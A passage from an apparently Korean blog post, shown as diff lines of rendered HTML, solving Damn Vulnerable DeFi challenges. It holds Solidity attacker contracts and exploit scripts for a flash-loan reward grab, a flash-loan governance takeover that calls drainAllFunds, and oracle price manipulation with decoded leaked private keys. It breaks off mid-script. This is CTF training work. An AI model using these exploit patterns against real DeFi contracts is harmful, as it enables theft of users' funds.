+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> rewardToken;
+
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> liquidityToken;
+
+    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> testUint;
+
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _lenderPool, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _liquidityToken, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _rewardToken, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _rewarderPool, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _attacker) {
+        lenderPool <span style="color:#f92672">=</span> _lenderPool;
+        <span style="color:#75715e">//liquidityToken = _liquidityToken;
+</span><span style="color:#75715e"></span>        liquidityToken <span style="color:#f92672">=</span> _liquidityToken;
+        rewarderPool <span style="color:#f92672">=</span> _rewarderPool;
+        rewardToken <span style="color:#f92672">=</span> _rewardToken;
+        attacker <span style="color:#f92672">=</span> _attacker;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">receiveFlashLoan</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> {
+        require(msg.sender <span style="color:#f92672">==</span> lenderPool, <span style="color:#e6db74">&#34;Sender must be pool&#34;</span>);
+
+        <span style="color:#75715e">// Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">uint256</span> amountToBeRepaid <span style="color:#f92672">=</span> amount;
+
+        IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid);
+
+        IRewarderPool(rewarderPool).deposit(amountToBeRepaid);
+        IRewarderPool(rewarderPool).withdraw(amountToBeRepaid);
+        
+        <span style="color:#75715e">// Flashloan Repayment : Pay back to LenderPool(flashloan)
+</span><span style="color:#75715e"></span>        IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid);
+        
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execFlashLoans</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> {
+        IFlashLoanerPool(lenderPool).flashLoan(amount);
+
+        IRewardToken(rewardToken).transfer(
+            msg.sender,
+            IRewardToken(rewardToken).balanceOf(<span style="color:#66d9ef">address</span>(this))
+        );
+        
+    }
+
+    receive () <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+}
+</code></pre></div><p><strong>the-rewarder.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FlashLoanTheRewarder</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanTheRewarder&#39;</span>, <span style="color:#a6e22e">attacker</span>);
+<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attackerContract</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">FlashLoanTheRewarder</span>.<span style="color:#a6e22e">deploy</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">flashLoanPool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">liquidityToken</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewardToken</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewarderPool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>);
+
+<span style="color:#75715e">// Next Reward Round!
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;evm_increaseTime&#34;</span>, [<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>]); <span style="color:#75715e">// 5 days
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attackerContract</span>.<span style="color:#a6e22e">execFlashLoans</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#39;1000000&#39;</span>));
+
+
+<span style="color:#75715e">//console.log(await this.attackerContract.check());
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewarderPool</span>.<span style="color:#a6e22e">roundNumber</span>());
+<span style="color:#75715e">// for (let i = 0; i &lt; users.length; i++) {
+</span><span style="color:#75715e">//     console.log(await this.rewardToken.balanceOf(users[i].address));
+</span><span style="color:#75715e">// }
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewardToken</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>));
+</code></pre></div><hr>
+<h2 id="-6-selfie"># 6. Selfie<a hidden class="anchor" aria-hidden="true" href="#-6-selfie">#</a></h2>
+<h3 id="summary-5">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-5">#</a></h3>
+<p>Flash Loan을 제공하며 거버넌스 메커니즘을 기반으로 제어가 가능한 150만개의 DTV 토큰을 보유하고 있는 Lending Pool이 있다.</p>
+<p>공격자는 0개의 DTV 토큰을 가지고 있으며, 해당 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SelfiePool.sol
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * @notice 컨트랙트(펀드)에 있는 모든 토큰 잔액을 해당 주소로 전송 (governance만 해당 함수 호출 가능)
+</span><span style="color:#75715e"> * @param receiver 모든 토큰 잔액을 전송할 대상 주소
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">drainAllFunds</span>(<span style="color:#66d9ef">address</span> receiver) <span style="color:#66d9ef">external</span> onlyGovernance {
+    <span style="color:#66d9ef">uint256</span> amount <span style="color:#f92672">=</span> token.balanceOf(<span style="color:#66d9ef">address</span>(this));
+    token.transfer(receiver, amount);
+    
+    emit FundsDrained(receiver, amount);
+}
+...
+</code></pre></div><p>Flash Loan 컨트랙트에는 거버넌스만이 실행할 수 있으며 지정된 계정으로 모든 토큰을 보내는 <code>drainAllFunds()</code> 함수를 제공하고 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SimpleGovernance.sol
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * @notice 거버넌스 큐에 실행할 작업을 적재
+</span><span style="color:#75715e"> * @param receiver 작업을 실행할 컨트랙트의 주소
+</span><span style="color:#75715e"> * @param data 작업에 사용할 calldata(함수 이름, 인자 등)
+</span><span style="color:#75715e"> * @return 큐에 적재된 작업의 식별자(actionId)
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">queueAction</span>(<span style="color:#66d9ef">address</span> receiver, <span style="color:#66d9ef">bytes</span> calldata data, <span style="color:#66d9ef">uint256</span> weiAmount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>) {
+    require(_hasEnoughVotes(msg.sender), <span style="color:#e6db74">&#34;Not enough votes to propose an action&#34;</span>);          <span style="color:#75715e">// 큐에 작업을 추가하기 위해서는 전체 토큰 발행량의 절반 이상을 가지고 있어야 함
+</span><span style="color:#75715e"></span>    require(receiver <span style="color:#f92672">!=</span> <span style="color:#66d9ef">address</span>(this), <span style="color:#e6db74">&#34;Cannot queue actions that affect Governance&#34;</span>);      <span style="color:#75715e">// governance 컨트랙트 내 함수는 실행하지 못함
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">uint256</span> actionId <span style="color:#f92672">=</span> actionCounter;
+
+    GovernanceAction <span style="color:#66d9ef">storage</span> actionToQueue <span style="color:#f92672">=</span> actions[actionId];
+    actionToQueue.receiver <span style="color:#f92672">=</span> receiver;
+    actionToQueue.weiAmount <span style="color:#f92672">=</span> weiAmount;
+    actionToQueue.data <span style="color:#f92672">=</span> data;
+    actionToQueue.proposedAt <span style="color:#f92672">=</span> block.timestamp;     <span style="color:#75715e">// 작업이 큐에 적재된 시간(timestamp)
+</span><span style="color:#75715e"></span>
+    actionCounter<span style="color:#f92672">++</span>;
+
+    emit ActionQueued(actionId, msg.sender);
+    <span style="color:#66d9ef">return</span> actionId;
+}
+...
+<span style="color:#75715e">/**
+</span><span style="color:#75715e"> * @notice 거버넌스 큐에 적재된 작업 실행
+</span><span style="color:#75715e"> * @param actionId 실행할 작업의 식별자(actionId)
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeAction</span>(<span style="color:#66d9ef">uint256</span> actionId) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+    <span style="color:#75715e">// _canBeExecuted()에 의해 (1) 아직 실행된 적이 없고(executedAt==0), (2) 큐에 적재된지 2일 이상이 지난 작업만 실행 가능
+</span><span style="color:#75715e"></span>    require(_canBeExecuted(actionId), <span style="color:#e6db74">&#34;Cannot execute this action&#34;</span>);
+    
+    GovernanceAction <span style="color:#66d9ef">storage</span> actionToExecute <span style="color:#f92672">=</span> actions[actionId];
+    actionToExecute.executedAt <span style="color:#f92672">=</span> block.timestamp;
+
+    actionToExecute.receiver.functionCallWithValue(
+        actionToExecute.data,           <span style="color:#75715e">// address target
+</span><span style="color:#75715e"></span>        actionToExecute.weiAmount       <span style="color:#75715e">// bytes memory data
+</span><span style="color:#75715e"></span>    );
+
+    emit ActionExecuted(actionId, msg.sender);
+}
+</code></pre></div><p>해당 거버넌스 메커니즘은 총 200만개가 발행된 DTV 토큰 중에서, 100만개를 초과한 토큰을 가진 계정만이 Lending Pool을 제어할 수 있는 action을 queue에 삽입할 수 있다.</p>
+<p>Flash Loan으로부터 150만개의 토큰(총 발행량의 과반이 넘는 토큰양)을 대출한 뒤, 거버넌스 큐에 drainAllFunds() 함수를 실행하는 action을 삽입한다.</p>
+<p>이후 queue에 있는 action을 실행하여 Lending Pool의 모든 토큰을 공격자의 계정으로 옮길 수 있다.</p>
+<h3 id="exploit-5">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-5">#</a></h3>
+<p><strong>SelfiePool.sol</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IDamnValuableToken</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transferFrom</span>(<span style="color:#66d9ef">address</span> sender, <span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">address</span> spender, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> account) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+}
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IDamnValuableTokenSnapshot</span> {
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">snapshot</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getBalanceAtLastSnapshot</span>(<span style="color:#66d9ef">address</span> account) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTotalSupplyAtLastSnapshot</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+}
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ISimpleGovernance</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">queueAction</span>(<span style="color:#66d9ef">address</span> receiver, <span style="color:#66d9ef">bytes</span> calldata data, <span style="color:#66d9ef">uint256</span> weiAmount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeAction</span>(<span style="color:#66d9ef">uint256</span> actionId) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getActionDelay</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+}
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ISelfiePool</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">uint256</span> borrowAmount) <span style="color:#66d9ef">external</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">drainAllFunds</span>(<span style="color:#66d9ef">address</span> receiver) <span style="color:#66d9ef">external</span>;
+}
+
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanSelfie</span> {
+    <span style="color:#f92672">using</span> Address <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>;
+
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> attacker;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> token;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> governance;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> lenderPool;
+    
+    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> actId;
+
+    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _attacker, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _token, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _governance, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _lenderPool) {
+        attacker <span style="color:#f92672">=</span> _attacker;
+        token <span style="color:#f92672">=</span> _token;
+        governance <span style="color:#f92672">=</span> _governance;
+        lenderPool <span style="color:#f92672">=</span> _lenderPool;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">receiveTokens</span>(<span style="color:#66d9ef">address</span> _tokenAddress, <span style="color:#66d9ef">uint256</span> _borrowAmount) <span style="color:#66d9ef">external</span> {
+        <span style="color:#75715e">// Flash loan borrow
+</span><span style="color:#75715e"></span>       
+        IDamnValuableTokenSnapshot(_tokenAddress).snapshot();
+
+        actId <span style="color:#f92672">=</span> ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature(<span style="color:#e6db74">&#34;drainAllFunds(address)&#34;</span>, attacker), <span style="color:#ae81ff">1</span>);
+        
+        <span style="color:#75715e">// Flash loan repayment : pay back to flash loan
+</span><span style="color:#75715e"></span>        IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount);
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeFlashLoans</span>(<span style="color:#66d9ef">uint256</span> _amount) <span style="color:#66d9ef">external</span> {
+        ISelfiePool(lenderPool).flashLoan(_amount);
+    }
+
+    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+}
+</code></pre></div><p><strong>selfie.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FlashLoanSelfieFactory</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanSelfie&#39;</span>, <span style="color:#a6e22e">attacker</span>);
+<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">FlashLoanSelfieFactory</span>.<span style="color:#a6e22e">deploy</span>(<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">governance</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>);
+
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploit</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">executeFlashLoans</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1500000&#34;</span>));
+
+<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;evm_increaseTime&#34;</span>, [<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>]); <span style="color:#75715e">// 2 days
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">governance</span>.<span style="color:#a6e22e">executeAction</span>(<span style="color:#ae81ff">0</span>);
+</code></pre></div><hr>
+<h2 id="-7-compromised"># 7. Compromised<a hidden class="anchor" aria-hidden="true" href="#-7-compromised">#</a></h2>
+<h3 id="summary-6">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-6">#</a></h3>
+<p>&ldquo;DVNFT&quot;라는 NFT를 거래하는 마켓이 있으며, 해당 NFT는 개당 999 ETH에 판매되고 있다.</p>
+<p>NFT의 판매 가격은 3개의 Trusted Reporter가 설정한 가격의 median 값을 사용하고 있다.</p>
+<p>NFT 마켓은 9900 ETH, 공격자는 0.1 ETH를 보유하고 있는 상황에서 마켓이 가진 모든 ETH를 가져오는 것이 목표이다.</p>
+<p>해당 마켓으로부터 다음과 같은 on-chain 데이터가 유출되었다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">HTTP/2 200 OK
+content-type: text/html
+content-language: en
+vary: Accept-Encoding
+server: cloudflare
+
+4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+</code></pre></div><p>유출된 두개의 데이터는 2개의 Trusted Reporter 계정의 개인키(Private Key)이므로, 해당 개인키를 이용해 NFT 마켓의 NFT 가격을 낮게 설정하는 트랜잭션을 송신함으로써 시세 조작이 가능하다.</p>
+<pre tabindex="0"><code>// TrustfulOracle.sol
+...
+function _computeMedianPrice(string memory symbol) private view returns (uint256) {
+    uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));
+
+    // calculate median price
+    if (prices.length % 2 == 0) {
+        uint256 leftPrice = prices[(prices.length / 2) - 1];
+        uint256 rightPrice = prices[prices.length / 2];
+        return (leftPrice + rightPrice) / 2;
+    } else {
+        return prices[prices.length / 2];
+    }
+}
+...
+</code></pre><p>Trusted Reporter가 설정한 가격을 통해, 홀수인 경우 <code>prices[prices.length / 2]</code>와 같이 median price를 계산한다.</p>
+<p>공격자는 3개중 2개의 개인키를 가지고 있기 때문에, 원하는대로 median price를 조작하는 것이 가능하다.</p>
+<h3 id="exploit-6">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-6">#</a></h3>
+<p><strong>compromised.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// load wallet/signer from Private Key
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Leaked Hex Data -&gt; Base64Decode
+</span><span style="color:#75715e">// 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">privKey1</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&#34;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wallet1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">Wallet</span>(<span style="color:#a6e22e">privKey1</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>);
+
+<span style="color:#75715e">// 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">privKey2</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&#34;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wallet2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">Wallet</span>(<span style="color:#a6e22e">privKey2</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>);
+
+<span style="color:#75715e">// Makret Manipulation (Price to low)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet1</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>));
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet2</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>));
+
+<span style="color:#75715e">// buy
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exchange</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">buyOne</span>({<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>)});
+
+<span style="color:#75715e">// Makret Manipulation (Price to high)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet1</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9990.01&#34;</span>));
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet2</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9990.01&#34;</span>));
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">getAllPricesForSymbol</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>));
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">getMedianPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>));
+
+<span style="color:#75715e">// approve &amp; sell
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">nftToken</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exchange</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exchange</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">sellOne</span>(<span style="color:#ae81ff">0</span>);
+
+<span style="color:#75715e">// price recovery
